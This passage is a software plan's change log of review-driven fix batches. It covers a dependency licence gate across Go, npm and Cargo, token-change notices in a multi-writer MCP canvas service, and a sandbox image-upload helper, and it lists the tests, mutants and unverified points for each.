- Whether minimising Edge fires `visibilitychange` within 5 s. S11 records the wait.
- That WebView2 runs without the three switches. Checked: nothing in `desktop/src-tauri`'s
  `*.json`, `*.rs` or `*.toml` sets `additionalBrowserArgs` or a background switch. Not checked:
  the default arguments Tauri itself passes to WebView2.

## Fix batch b05 (2026-09-24) — I9, I10

Scope: the licence gate (task 04), P5-P and OQ-P5-2. Commits `db05359` (I9) and `1027adb` (I10),
then this section with two added test rows. Line numbers are after this batch.

### I9 — the gate decides first party by structure and enforces what shipped source reaches

| Hole | Change | Where |
|---|---|---|
| 1. A bundled devDependency was only reported | "Ships" now means *reached from non-test source*: every package a non-test file under `desktop/src` or `canvas/editor/src` imports, with its production closure, whichever list declares it. `ShippedImports` walks to a fixed point through relative imports, so a test helper that shipped code imports is walked too. Specifiers come from the project's own `typescript` parser (`imports.cjs`) | `task-04.md:21-36` (the rule), `:39-41` (files), `:202-221` (`NpmDeps`), `:248-261` (`ShippedImports`), `:264-275` (`imports.cjs`), `:285-286` (what the run scans); tests `:319-321` |
| 2. First party was matched by name; the deny list's matching was unstated | No name list. Go: `.Module.Main`, or a directory `replace` inside `-root`. npm: the root node, or a `file:` link whose target is inside `-root`. Cargo: `source: null` inside `-root`. One helper, `insideRoot`, uses `filepath.Rel`. `Denied` matches exactly: `tldraw`, the `@tldraw` scope, and `github.com/tldraw` or paths under it | `task-04.md:62-89`; tests `:318`, `:322-323` |
| 3. A Go module with no licence file | `Classify` returns `("", "none", nil)`, and the dep fails with "no licence file in …", exit 1, not 2 | `task-04.md:180-184`, `:193-199` (`GoDeps`); test `:324` |
| 4. `npm ls --json` carries no path | `npm ls --all --json --long`: nodes are keyed by `path`, each copy is read from its own `package.json`, and children are unioned per path | `task-04.md:202-221`; test `:325` |

Restated in the plan: P5-P `:220`, the file list `:384`, task row `:404`, the total `:433`, OQ-P5-2 (a) `:506`, and the unverified list `:539-546`. That list named `go-licenses` and `license-checker` as tools task 04 "pins". Task 04 uses neither.

**Where I departed from the review's fix, and why.** The review said to enforce *every dependency of
`canvas/editor`*. That is wrong on one fact. `canvas/editor`'s dev list holds `vitest`
(`task-03.md:52`), and `vitest` 5.0.1 takes `vite` as a peer
(`desktop/node_modules/vitest/package.json:124`). The installed `vite` 8.3.0 depends on
`lightningcss` (`vite/package.json:59`), which is `MPL-2.0` (`lightningcss/package.json:4`). All
three were read in the main tree on 2026-09-24. So that rule fails the gate on day one, on a build
tool that never ships. The root cause is the same in both projects: what ships is what shipped
source reaches. So the import rule applies to `desktop` and `canvas/editor` alike. It catches the
review's `html-to-image` case and passes `vitest`.

**Why a parser, not a regular expression.** `desktop/src/components/develop/CanvasLayout.tsx:97` is
a shipped file with a comment reading `from "this id is merely absent"`, which a `from "x"` pattern
takes for an import. A probe with `typescript` 6.0.3 read two sources exactly: a fixture holding
that comment, a JSX apostrophe and `/"/g`, and the real `CanvasLayout.tsx`.

### I10 — the gate reports Cargo, and OQ-P5-2 states the crates

| Change | Where |
|---|---|
| `CargoDeps`: `cargo metadata --offline --locked --format-version 1 --filter-platform x86_64-pc-windows-msvc`. It is report-only behind `CargoEnforced` (the OQ-P5-2 seam), reads Cargo's `/` as OR, and gives the chain through normal edges plus a proc-macro flag. A missing cargo prints `REPORT cargo: not scanned` and does not change the exit code | `task-04.md:94-101`, `:223-242`, `:288-291`, `:302-305`; tests `:326`, `:329` |
| The first-run report lists every `REPORT cargo` line and, at minimum, the table of `MPL-2.0` crates. An exception cannot cover them (it must resolve to an allowed licence), so they are recorded, not excepted | `task-04.md:338-365` |
| Acceptance expects the Cargo lines | `task-04.md:378-381` |
| "Not claimed" now says Cargo is reported, not enforced, and states the facts | `task-04.md:390-395` |
| OQ-P5-2 rewritten: the crates, what `MPL-2.0` obliges, the recommendation (report in phase 5) and the likely answer (allow `Zlib` and `Unicode-3.0`; waive the `MPL-2.0` crates by an owner-signed, version-pinned list) | plan `:506` |

**A fifth `MPL-2.0` crate.** `cargo metadata` on 2026-09-24 (263 packages), with each licence read
from the crate's own `Cargo.toml` in the local registry, found these:

- `cssparser 0.36.0` (`:587`), `selectors 0.36.1` (`:2923`) and `dtoa-short 0.3.5` (`:850`), the
  crates the review named, reached through `tauri 2.11.5 → tauri-utils 2.9.3 → dom_query 0.27.0`.
- `option-ext 0.2.0` (`:2382`), reached through `tauri → dirs 6.0.0 → dirs-sys 0.5.0`.
- **`cssparser-macros 0.6.1` (`Cargo.lock:600`)**, a proc-macro, which the review did not count.

The same read found licences outside `OD-11`'s four families: 18 `Unicode-3.0` crates,
`unicode-ident` under `(MIT OR Apache-2.0) AND Unicode-3.0`, and two `Zlib` crates. All of them are
in OQ-P5-2 now.

### Mutants named for the next implementer (the two most likely to survive)

1. **`insideRoot` as `strings.HasPrefix`.** A `file:` link into `<root>-fork` would pass as first
   party. The row at `task-04.md:322` now kills it.
2. **Test-file exclusion by substring** (`strings.Contains(path, "test")`). `src/latest/` and
   `contest.tsx` would go unscanned. The row at `task-04.md:320` now kills it.

**Restatement greps run** over the plan and every part, for:
`82.5|Cargo|crate|OQ-P5-2|dev dependenc|licence gate|licencegate|tldraw/|FirstParty|DeniedNames|npm ls`.
Every hit was changed, or already agreed with this batch. `task-24.md:23-24` adds
`modern-screenshot` without naming a list; the import rule enforces it either way.

**Unverified:**
- Whether `npm ls` prints a deduplicated node's children. The gate unions them by path either way.
- Whether the CI agent has `cargo`. The gate says so in one line if it does not.
- Which of the four `lib` `MPL-2.0` crates link into the release binary. `cargo metadata` unifies
  features across build and normal use.
- Plugin-react's injected imports. They come from its documentation, not from this tree.

Nothing was built. This batch changes documents only.

## Fix batch b05, round 2 (2026-09-24) — the re-review's open issues (`plan-rereview-b05-1.md`)

Commits `d0151fa` (RR-I9-1, RR-I9-2, RR-I9-3, RR-M2, RR-M3, RR-M4, and RR-M1's first form),
`c9a0016` (RR-M1 as built: `canon` keeps junctions), and this section's commit. Paths are relative
to `docs/superpowers/plans/`; `parts/` is `2026-09-23-phase-5-design-canvas-parts/`. Lines are as
of this section's commit. **This section supersedes round 1's row for hole 2** (`:1182`) and its
first named mutant (`:1227-1228`): first party is no longer "inside `-root`".

| Finding | Change | Where |
|---|---|---|
| RR-I9-1 the link target read one level too deep, any `file:` read as a link | A link is what the project's `package-lock.json` states: the entry at the node's location has `"link": true`, and its `resolved` is the target relative to the project (read in the re-review's fixture: `"node_modules/c": {"resolved": "sub/c", "link": true}`). `npm ls`'s own `resolved` is never read: it is relative to the link's parent for a link and to the project for a tarball. A `file:` tarball has no `link`, so it is third party and checked. A node with no lockfile entry is checked, so only a positive `"link": true` exempts | `parts/task-04.md:84-99` (rule), `:266-274` (`NpmDeps`); plan `:220` (P5-P), `:541-545` (the old "relative to the link" wording corrected) |
| RR-I9-1 tests | `TestNpmDeps_firstPartyIsStructural` requires fixtures copied from a real npm run, the version and command named in the test's comment; adds the `<root>-fork` link, whose `npm ls` `resolved` joined to `path` lands inside `-root`, and the `GPL-3.0` `file:vendor/g-1.0.0.tgz` tarball | `parts/task-04.md:395` |
| RR-I9-2 inside the repository is not ours | First party means a project the gate scans. Go: `.Module.Main` only; a directory `replace`, inside `-root` or out, is classified from `Replace.Dir` (neither `go.mod` has a `replace` today). npm: the root of a scanned project, or a link whose target is exactly one; any other in-root link fails "first-party link <path> is not a scanned project", with both remedies named (add it to the scan list, or ship a vendored copy as a `file:` tarball, which is checked); a link outside `-root` is classified and descended. Cargo: `workspace_members` only (today one member, `desktop@0.1.0`) | `parts/task-04.md:74-101` (rule), `:244-246` (`GoDeps`), `:266-275` (`NpmDeps`, which gains a `scanned []string` parameter), `:281-282` (`CargoDeps`), `:348-350` (the scan list is the npm first-party list); plan `:220` |
| RR-I9-2 tests | the Go row flipped: a directory `replace` into `<root>/third_party/gpl-lib` is classified and fails; the npm row adds a `GPL-3.0` link into `<root>/vendor/x`, which fails "not a scanned project"; the Cargo row skips only the `workspace_members` id, and an in-root path crate that is not a member is a `Dep` | `parts/task-04.md:395`, `:397`, `:400` |
| RR-I9-3 `license.md` on a case-sensitive CI agent | `Classify` matches its names case-insensitively over `os.ReadDir` (`strings.EqualFold`), never by opening a fixed name, and `source` is the entry's real name. Read on 2026-09-24: `github.com/josharian/intern@v1.0.0` in the module cache holds `README.md`, `go.mod`, `intern.go`, `intern_test.go` and `license.md` (the MIT text), nothing else | `parts/task-04.md:209-218` |
| RR-I9-3 test | `TestClassify` adds a directory holding only `license.md` → `MIT`, source `license.md`. The source assertion kills the open-a-fixed-name mutant on Windows too, because the open succeeds there but reports `LICENSE.md` | `parts/task-04.md:401` |
| RR-M1 8.3 short paths | `canon`: `filepath.Abs`, then on Windows `syscall.GetLongPathName` (standard library, so the module stays stdlib-only), then `filepath.Clean`; compared with `strings.EqualFold` on Windows. New files `canon_windows.go`, `canon_other.go`. A missing path is exit 2. `TestCanon` covers case, the `<r>-fork` prefix, a short `os.TempDir()`, and a junction | `parts/task-04.md:40-41`, `:102-129`, `:396`; plan `:384-385`, `:546-547` |
| RR-M2 Cargo `/` with spaces | `/` is OR with or without spaces; the tree's four forms are named with counts (`Unlicense/MIT` 2, `MIT/Apache-2.0` 11, `BSD-3-Clause/MIT` 1, `Apache-2.0 / MIT` 1, read from the re-review's saved `cargo metadata`); `TestCargoDeps` asserts the spaced form | `parts/task-04.md:285-291`, `:400` |
| RR-M3 the CI Cargo cache | a `cargo fetch --locked` step before the gate, `continueOnError: true`, which prints a line when `cargo` is absent; the text now says the cache, not `cargo` alone, decides whether CI's report runs | `parts/task-04.md:362-365` (YAML), `:370-378`; plan `:552-555` |
| RR-M4 the walk's extensions | `.mts`, `.cts` and `.cjs` join the walk; `TestShippedImports` finds a bare import in each | `parts/task-04.md:310-311`, `:393` |

**Where I departed from the re-review's fix, and why.**
- RR-I9-1: the re-review offered `npm query ":link"` or the lockfile. I took the lockfile. On the
  re-review's own fixture, `npm query ":link"` returns the link **targets** (`location: "../b"`,
  `"sub/c"`, with `path` equal to `realpath`), not the link nodes. So its output cannot be joined
  to the `npm ls --long` node that sits at `node_modules/c`. The lockfile keys each link by that
  node's own location. Both projects already commit their lockfiles (`parts/task-03.md:148`,
  `:170-171`), and `npm ci` requires them.
- RR-M1: the re-review said to canonicalise both sides, and my first form in `d0151fa` used
  `filepath.EvalSymlinks`. That is wrong for this program. A worktree's `desktop/node_modules` is a
  junction into the main tree (the program's rule 5), so resolving links would move every node's
  location out of its project. The first-party link to `canvas/editor` would then find no lockfile
  entry, get checked, and fail as `UNLICENSED` in every worktree. A probe on 2026-09-24 (go1.26.2,
  Windows, a junction made with `mklink /J` in the scratchpad) showed `GetLongPathName` keeping
  `\j\f.txt` and expanding `AU-DEV~1`. On the same probe, `EvalSymlinks` returned "The system
  cannot find the path specified". Commit `c9a0016` replaced it.
- Hours stay at 4. The round's changes are contract wording, one small platform file and test
  rows inside the existing tests, so the plan's total (`:433`) is unchanged.

**Mutants named for the next implementer (the two most likely to survive, named before any run).**
1. **`canon` as `filepath.EvalSymlinks`.** It passes every fixture that has no junction in it, and
   a Linux CI run has none. `TestCanon`'s junction case kills it on Windows (`parts/task-04.md:396`).
2. **`Classify` opening fixed names instead of reading entries.** It passes on Windows because the
   filesystem ignores case. `TestClassify`'s assertion that `source` is `license.md` kills it there,
   and the directory holding only `license.md` kills it on Linux (`parts/task-04.md:401`).

**Restatement greps run** over the plan and every part, for:
`first.party|in-root|file: link|Replace|insideRoot|resolved|joined to|source: null|LICENSE\.md|\.mjs|registry cache|licencegate|NpmDeps\(`.
Every hit was changed, or already agreed with this round. The gate's later callers
(`parts/task-07.md:480`, `parts/task-24.md:190`, `:195`, `parts/task-26.md:107`, `parts/task-30.md:111`,
`:164`) run `go run ./tools/licencegate -root .` and need no change.

**Unverified:**
- How `npm ls` prints the nodes under a worktree's junctioned `node_modules`. The gate takes links
  from the lockfile alone, so a node that npm shows as a link but the lockfile does not is checked.
- How `go list` prints `Module.Dir` under a short working directory. `canon` makes it not matter.
- Whether the hosted CI agent has `cargo`, and whether its `cargo fetch --locked` gets through.
- The case of the other 56 third-party Go modules' licence file names on Linux. Case-insensitive
  matching makes it not matter.

Nothing was built. This round changes documents only.

## Fix batch b06 (2026-09-24) — I11, I12

Scope: MCP multi-writer and asset gaps. Commits `0f1607d` (both findings), `b77f439` (two test
rows strengthened against the likeliest survivors), then this section's commit (OQ-P5-6 and this
section). Paths are relative to `docs/superpowers/plans/`; `parts/` is
`2026-09-23-phase-5-design-canvas-parts/`. Lines are as of this section's commit.

### I11 — a token change is noticed to every holder of an artboard that uses it

| Change | Where |
|---|---|
| The rule: a token change is an edit to every artboard that uses the token; the author and the token are named | `parts/task-12.md:15-20` (Why, rule 3) |
| The mechanism: for a batch with `set_token` or `delete_token`, `Apply` records `tokenUses[revision]`, from `serialize.TokensUsed` over every artboard **before** `Commit` (a deleted token and an old value's references are seen) and **after** it (a new token is), intersected with `Change.Tokens`. Transitive through task 08's `TokensUsed`. A token batch touches no artboard, so it claims nothing and no claim refuses it. In memory, like the claims and marks | `parts/task-12.md:120-135`; the `apply.go` file entry `:28-30` |
| `Notices` reaches a holder through `Change.Artboards` **or** the token record; one change is at most one notice | `parts/task-12.md:110-118` |
| `Notice` gains `Tokens`; `Nodes` is `[]` for a change that reached only through tokens; a token `Text` example | `parts/task-12.md:104-107` |
| `checkIfRevision` states why tokens need no precondition to stay non-silent | `parts/task-12.md:88-93` |
| Tests: `TestNotices_tokenChange` (the review's scenario, plus an unchanged second token and a batch that both edits a node and sets a token) and `TestNotices_tokenTransitiveAndDelete` | `parts/task-12.md:210-211` |
| Not claimed: last-writer-wins per token, never silent; the per-token `ifRevision` not built, and why | `parts/task-12.md:234-239` |
| Task 12 now depends on 08 (`authority` imports `serialize`, which builds on 05 and 07 only) and is 3.5 h | `parts/task-12.md:3`; plan row `:427` |
| Goal 3 states the token case | plan `:40-47` |
| `set_tokens` takes no claim and no `ifRevision`, and produces the notices | `parts/task-17.md:48` |
| The instructions (item 7) and `canvas-rules` teach token notices; `TestInstructions_pinned` requires `a token` | `parts/task-17.md:70`, `:79`, `:91` |
| The hands-on session checks a shared-token notice between two agents | `parts/task-30.md:131-132` |

**The optional per-token `ifRevision` is not built, and why.** It would add a revision to
`doc.Token` (task 05) and a `tokens` field to `ConflictError` (`task-11.md:301-303`), to the MCP
error map (`task-15.md:105`) and to the REST 409 (`task-20.md:192`), which is four more contracts,
for a collision the notice already reports. The finding's failure is that S *never hears*; the
notice closes that. A stale token overwrite stays last-writer-wins, like a node write without
`ifRevision`. The seam is named in `parts/task-12.md:236-239`.

### I12 — `canvas-upload`, a sandbox helper that sends an image file as the session

| Change | Where |
|---|---|
| `images/sandbox/canvas-upload.cjs` → `/usr/local/bin/canvas-upload`: CommonJS, `node:http`, no `Origin`, no `MCP-Protocol-Version`; extension → media type; over 10 MiB, unknown type or unreadable → exit 2 with nothing sent; `structuredContent` on stdout, exit 0; a tool refusal or a transport failure → exit 1 | `parts/task-16.md:93-143` |
| The Dockerfile's `COPY` and `chmod` lines (`images/sandbox/Dockerfile:21-22` read in this worktree, and `:10` is `FROM node:20-bookworm-slim`) | `parts/task-16.md:18-21`, `:104-109` |
| The security corollary: every sandbox process can act on the canvas as its session, within its scope; the helper adds no power | `parts/task-16.md:145-148`; plan G4 `:274-279`; plan "How an agent reaches MCP" `:140-143` |
| `upload_asset`'s schema description and behaviour row point to the helper | `parts/task-16.md:60`, `:83` |
| Tests: `TestCanvasUpload_helper` runs an extensionless copy against the real tool over `httptest` (success, `invalid`, exit 2 with no request, not reachable), with a static pin against ES-module syntax; `TestImage_shipsCanvasUpload` pins the Dockerfile lines | `parts/task-16.md:168-169` |
| Taught: the instructions (item 4) and `TestInstructions_pinned`; `canvas-rules` (usage and exit codes); `code-to-design`; the remote-image dropped reason | `parts/task-17.md:67`, `:79`, `:82`, `:91`; `parts/task-07.md:112` |
| Proven in a real sandbox: task 30 step 1 runs it through `docker exec` and checks the author | `parts/task-30.md:57-60` |
| Not claimed: host Node only in task 16; the Bash permission prompt | `parts/task-16.md:189-193`; plan's unverified list `:550-553` |
| Task 16 is 3.5 h; file map entry for `images/sandbox/` | `parts/task-16.md:3`; plan rows `:431`, `:384-386` |
| **OQ-P5-6** (new): pre-allow `canvas-upload` like the canvas tools? Recommended **no** in phase 5; the seam is one `--allowedTools` entry in task 19 | plan `:526` |

**A fact the review's fix did not hold.** A helper written as an ES module and copied to an
extensionless `canvas-upload` would still pass a host-side test: the host's Node 24.15.0 ran an
extensionless file containing `import fs from "node:fs"` (probe in the stream scratchpad,
2026-09-24). So the helper is CommonJS, the test runs an extensionless copy, and a static check
refuses `import`/`export` lines.

**The threat-model paragraph.** The review's *What is missing* asks for a paragraph naming three
trust boundaries. This batch states only I12's corollary, in G4 and in the MCP-reach paragraph. The
full paragraph is not I11 or I12's, and is left to the batch that owns it.

### Hours and the critical path

Total **85 h** (84 before b06; plan `:448`). Critical path **≈ 35.5 h** (34.5 before): task 12's
0.5 h moves everything after it, and task 16 at 3.5 h now finishes at 20 h, past 15's 19.5 h, so
the path runs 12 → 16 → 17 (plan `:450-455`). 20a now finishes at 21 h against 17's 22.5 h. 12's
new dependency on 08 adds nothing: 08 finishes at 8.5 h and 11 at 13 h. All recomputed from the
table by earliest finish.

### Mutants named for the next implementer (the two most likely to survive)

1. **Token uses read only after `Commit`.** A deleted token is unknown by then, and `TokensUsed`
   skips unknown names, so the holder is never told of the delete. Killed by
   `TestNotices_tokenTransitiveAndDelete`'s second half (`parts/task-12.md:211`).
2. **`uses[A]` not intersected with `Change.Tokens`.** The notice lists every token the artboard
   uses. It would survive the review's scenario, where *Settings* used only `brand`; the row now
   gives *Settings* an unchanged `space-4` and requires `Tokens: [brand]` exactly
   (`parts/task-12.md:210`).

Also killed by the rows as written: two notices for one change (`:210`'s mixed batch); a size check
after the request (`TestCanvasUpload_helper` counts requests); ES-module syntax (its static pin).

**Restatement greps run** over the plan and every part, for:
`upload_asset|base64|canvas-upload|Tokens and pages carry|tokens have no revision|touched an artboard
the caller|what someone else changed|Write in small pieces|remote images are not loaded|Notice|
notices|34\.5|84 hours|21\.5 h|20\.5 h|12 → 15 → 17|OQ-P5-5`. Every hit was changed, or already
agreed. `task-23.md:71` types `notices` as `unknown[]`, so `Notice.Tokens` needs no desktop change.

**Unverified:**
- Whether the image's Node 20 detects module syntax. CommonJS makes it not matter.
- That `node:http` sends no `Origin`. `TestCanvasUpload_helper`'s success case against the real
  server, which answers an `Origin` with 403, is where it gets proven.
- The `--allowedTools` pattern that would pre-allow a shell command (OQ-P5-6's seam).
- The fixture repository in task 30 carrying a 300 KB PNG: task 30 names it; no fixture exists yet.

Nothing was built. This batch changes documents only.

## Fix batch b06, round 2 (2026-09-24) — the re-review's open issues (`plan-rereview-b06-1.md`)

Commits `d0acb9d` (RR-I12-1, RR-I12-2, RR-I12-3), `da791e4` (RR-I11-1, RR-I11-2), and this
section's commit (two more test rows, named in the mutants below, and this section). Paths are
relative to `docs/superpowers/plans/`; `parts/` is `2026-09-23-phase-5-design-canvas-parts/`.
Lines are as of this section's commit. Round 1's line numbers for `parts/task-12.md` and
`parts/task-16.md` are as of `9dd8277`; this round moved them, and this table supersedes them.

| Finding | Change | Where |
|---|---|---|
| RR-I12-1 (Important) CRLF shebang once installed | Re-verified first: `git config --show-origin --get core.autocrlf` is `true` from `C:/Program Files/Git/etc/gitconfig`; `git ls-files --eol images/sandbox/` shows `i/lf w/crlf` for both files; no `.gitattributes` is tracked. Task 16 adds a root `.gitattributes` with `images/sandbox/** text eol=lf` (the root fix, which also repairs `entrypoint.sh` on a fresh checkout), and a paragraph saying why a host test cannot see the failure and why a Dockerfile `sed` is not the fix | `parts/task-16.md:21-23` (Files), `:123-136` (line endings); plan `:392-393` (file map) |
| RR-I12-1 tests | `TestCanvasUpload_helper`'s static check reads the raw bytes with `os.ReadFile` (never `bufio.Scanner`), refuses any `\r`, and requires the file to begin with exactly `#!/usr/bin/env node\n`. `TestImage_shipsCanvasUpload` also requires the `.gitattributes` line, so dropping the attribute fails on every OS, not only on a Windows checkout | `parts/task-16.md:193`, `:194` |
| RR-I12-2 the error code on stderr | The helper prints `canvas-upload: <structuredContent.error.code>: <text>`, since a `ToolError`'s text is the message alone (`parts/task-14.md:85-87`). `canvas-rules` says exit 1's stderr has that shape, and that the code is one from its error table. The re-review's optional note is taken too: a connection closed or reset before a response (what `sandboxd` does after `HoldTimeout`, `parts/task-18.md:101-107`) reads "not reachable", like a refused one | `parts/task-16.md:158-166`; `parts/task-17.md:79` |
| RR-I12-2 tests | The sniff case asserts a line beginning `canvas-upload: invalid: `. A stub-handler case (`isError: true`, code `conflict`, a real code from `parts/task-15.md:105`) requires exactly `canvas-upload: conflict: m`. An accept-and-close listener joins the "not reachable" case | `parts/task-16.md:193` |
| RR-I12-3 G4's "task 20b lists every new one" | G4 now says 20b lists the control plane's two, and names `PANACEA_APP_CANVAS_MCP_URL` as task 16's, read only by the sandbox helper for its test, never by the control plane, and not the on/off `PANACEA_APP_CANVAS_MCP`. Task 16's URL step says the same | plan `:281-284`; `parts/task-16.md:139-141` |
| RR-I11-1 pruning against present sessions | An entry is pruned only at or below every mark the service holds for the canvas, present or not. The check runs when a mark advances and in `ReleaseSession`, which now drops the session's marks as well as its claims. Presence never prunes | `parts/task-12.md:57-61` (`ReleaseSession`), `:137-144` (pruning); plan `:43-46` (goal 3: "even after a quiet spell (until a restart)") |
| RR-I11-1 test | New `TestNotices_tokenUsesOutliveAbsence` (injected clock). S holds *Settings*; T sets `brand` at +60 s; S is silent for 11 minutes while T keeps calling; S's next call gets the notice. The in-package test reads the record's length: 0 once S's mark passes the entry, and in a second run 1 before `ReleaseSession(S)` and 0 after it | `parts/task-12.md:221` |
| RR-I11-2 transitive only two levels deep | `TokensUsed` is the closure over token values: a fixed point, however deep, with a visited set so a cycle terminates and each token appears once. Task 12's comment and plan goal 3 ("however deep") say the same | `parts/task-08.md:83-87`; `parts/task-12.md:131-134`; plan `:43-44` |
| RR-I11-2 tests | `TestTokensUsed_transitive` has four rows: a three-level chain, a 40-token chain, a two-token cycle run under a 1 s timeout, and a chain through an unknown name. `TestNotices_tokenTransitiveAndDelete` uses `button → primary → brand`, so a one-hop reading misses `brand` | `parts/task-08.md:171`; `parts/task-12.md:220` |

**Where I departed from the re-review's fix, and why.**
- RR-I11-1: the re-review said *"`ReleaseSession` drops them"* about marks. The plan did not say
  so. `parts/task-12.md:57-58` spoke of claims only. So I made it a contract rather than assuming
  it. Without it, a session that never calls again would pin the record for ever.
- RR-I11-1: the re-review suggested a row in `TestNotices_tokenTransitiveAndDelete`. I made it a
  separate test instead, because it needs an injected clock and in-package access to the record,
  and neither of the other test's rows needs either.
- Hours stay as they were: 08 at its figure, 12 at 3.5 h, 16 at its figure. The changes are
  contract wording, one attribute file and test rows, so the plan's total and critical path are
  unchanged: 85 h and 35.5 h, as the re-review recomputed them.

**Mutants named for the next implementer (the two most likely to survive, named before the
rows were added).**
1. **A helper that prints a fixed code** (`canvas-upload: invalid: <text>` for every
   `isError`). It would survive a test that asserts only the sniff case. Killed by the
   stub-handler case, which requires `canvas-upload: conflict: m` (`parts/task-16.md:193`).
2. **A closure capped at a fixed depth**, used instead of a visited set to stop cycles. It
   passes a three-level chain and a two-token cycle. Killed by the 40-token chain row
   (`parts/task-08.md:171`).

The rows as written also kill:
- pruning against the caller's mark alone, or against claim holders only: S's notice is lost in
  `TestNotices_tokenUsesOutliveAbsence`'s first run;
- a `ReleaseSession` that keeps marks: the second run's 0 goes red;
- pruning only in `ReleaseSession`: the first run's 0 goes red;
- a CRLF on any line of the helper: the raw-byte `\r` check.

**Restatement greps run** over the plan and every part, for:
`transitive|tokens those tokens|present session|one level deep|TokensUsed|task 20b lists every new
one|CANVAS_MCP_URL|stderr names|isError|gitattributes|canvas-upload.cjs|TestNotices_token`. Every
hit was changed or already agreed. The re-review's cited `task-17.md:79` was the only other place
that stated the stderr shape.

**Unverified:**
- That Node reports a connection closed before a response as `ECONNRESET` or "socket hang up",
  and so can be mapped to "not reachable". The accept-and-close case in `TestCanvasUpload_helper`
  is where this gets proven.
- That a fresh checkout under the new attribute writes `images/sandbox/*` as LF on this machine.
  This follows from gitattributes' `eol=lf` overriding `core.autocrlf`. No file was checked out to
  test it, because `.gitattributes` is task 16's to create, not this batch's.

Nothing was built. This batch changes documents only.


---

## Fix batch b07 (2026-09-24) — M1, M2, M3, M4, M6, M9

Plan-document minors. Line numbers are the plan's and the parts' after this batch's two commits
(`b00cce8`, then the one after it).

| Finding | The change | Where |
|---|---|---|
| M1 | **Already fixed by b05** (its I9 row: *"That list named `go-licenses` and `license-checker` as tools task 04 'pins'"*). The bullet the review cited at `:503-505` is now the unverified-list item that restates the gate as our own program. Re-checked: no line in the plan or the parts says task 04 pins either tool; the only two mentions say it uses neither. No edit. | plan `:235` (P5-P), `:585-586`; `task-04.md:14` |
| M2 | Row 02 no longer claims the control plane's `replace`; it says the `require` and `replace` are task 19's (G1), matching `task-02.md` "Not claimed" and the file map. | plan `:435` |
| M3 | The shared-file list gains `go.work` (02, then 04), `designapi/routes.go` (20a, 21, 22, then 29) and `canvas/editor/src/editor/keys.ts` (25, then 29), with the rule that a later task starts its edit only after the earlier one is merged. The waves run 22 and 29 together, so the lane text says 29's `routes.go` line waits for 22's merge. Also completed while there: `mount.go` and `cmd/api/design.go` gain 22's `HandoffGit` (`task-22.md:27`, `:30-31`), which the old text left out. Task 29 names `routes.go` (it was absent from its file list although `TestMount_wrapsEveryRoute` counts route 27) and both waits. | plan `:492-503`; `task-29.md:14-17` |
| M4 | The file map names `editorPackage.test.tsx` (03), `docstores.ts`, `selectors.ts` (27), `DesignTop.tsx`, `Activity.tsx`, `DesignRenderers.tsx`, `DesignContextChip.tsx` (28), and `cmd/sandboxd/serve_posix.go` (18). The Repository line's `go.work` now names task 04's edit too. Each file checked against its part's file list: `task-03.md:25`, `task-27.md:22-23`, `task-28.md:15-17`, `task-18.md:27`; `serve_posix.go` exists in the tree. | plan `:397`, `:412`, `:417` |
| M6 | The review's first option, not the move to `canvas/core` (that rewrites canvas paths in 15 part files, 87 mentions, counted). Task 02 adds `canvas/editor/go.mod` (a comment and one `module` line), which `go.work` never `use`s. **Red, then green**, run 2026-09-24 on go1.26.2 against a `go 1.23` module in a scratch copy with a `go.work`: with a broken-syntax `editor/node_modules/stray/stray.go`, `go list ./canvas/...` named `…/editor/node_modules/stray` and `go vet` exited 1; with the file, `go list` named only `…/doc`, and `go vet`, `go build`, `go work sync` and `GOWORK=off go list ./...` exited 0. Task 05's `TestBoundary_editorModule` pins the file and that the workspace does not `use` it; the second half was checked the same way (`go list -m -f {{.Path}}` names `…/canvas/editor` only once `go.work` uses it). Task 03 is told the file is not its own. Restated in the architecture, the commands and the file map. Unverified: a go1.23 toolchain itself (none installed; the nested-module skip predates it). | `task-02.md:9-10`, `:16-17`, `:54-78`, `:101-105`, `:117`; `task-05.md:18-19`, `:311`; `task-03.md:17-19`; plan `:102-105`, `:252-255`, `:351` |
| M9 | The sibling-plan rows cite each id and its section, with the line where it stood at a named commit. Re-checked: at `feat/phase-4-discover` `64664b7` (the review's `c93fa04` is no longer HEAD), P4-A is `:171` (was cited `:169`) and S4-P5.1–3 are `:486-488` (the review's `:457-459` had drifted again). The phase 3 row had drifted the same way: at `feat/phase-3-git` `6c6b20f`, 3-D6 is `:157` (cited `:134`) and S3-P5.1 is `:407` (cited `:330`); fixed in the same edit. A paragraph names both plan files and says the ids, not the lines, are the citation. | plan `:201-214` |

**Mutants an implementer should expect to survive (named first, per rule 7).** (1) A
`canvas/editor/go.mod` holding only the comment, no `module` line: the go command's walk still
stops at it (checked in the same scratch copy: `go list` named only `…/doc`, `go vet` exited 0),
so no build test goes red; only `TestBoundary_editorModule`'s `module`-line check does. The
mutant is harmless to the walk; the check keeps the file a well-formed module file. (2) Moving the file to
`canvas/editor/src/go.mod`: `go list ./canvas/...` still names nothing under `editor` while no npm
package ships a `.go` file, so only the existence check at `editor/go.mod` catches it.

**Not done, and why.** M5 (`serve_other.go` missing from task 18's files) is not this batch's; when
it is fixed, the plan's `sandboxd` line (`:397`) must name `serve_other.go` too. Nothing was built
or run in the tree; the Go probes ran in the stream's scratch directory.

## Fix batch b08 (2026-09-24) — M14, M20, M22

Lens and end-to-end minors. Line numbers are the plan's and the parts' at `c520bd8`.

| Finding | The change | Where |
|---|---|---|
| M22 | Owner item 3 now says **which** three sessions. A session's branch is its worktree's (`task-14.md:110`, `BranchID`) and git checks a branch out in one worktree only, so before phase 3 the three run **in one worktree** (the main checkout). Verified that the route allows it: `sessions_resume_test.go:97-98` creates two sessions from one body (one `worktreeId`), both `201`. Unverified: that the cockpit's UI offers a second session in an occupied worktree, so the item says to use the route if it does not. With phase 3 in the tree, three clones on the one branch, as the product runs; the report records which ran. The review's quote was re-checked at its source: the phase 3 plan `:23` at `feat/phase-3-git` `a99d20b`. Goal 3 and P5-L say the same in one sentence each. | `task-30.md:130-142`; plan `:48-51` (goal 3), `:235` (P5-L) |
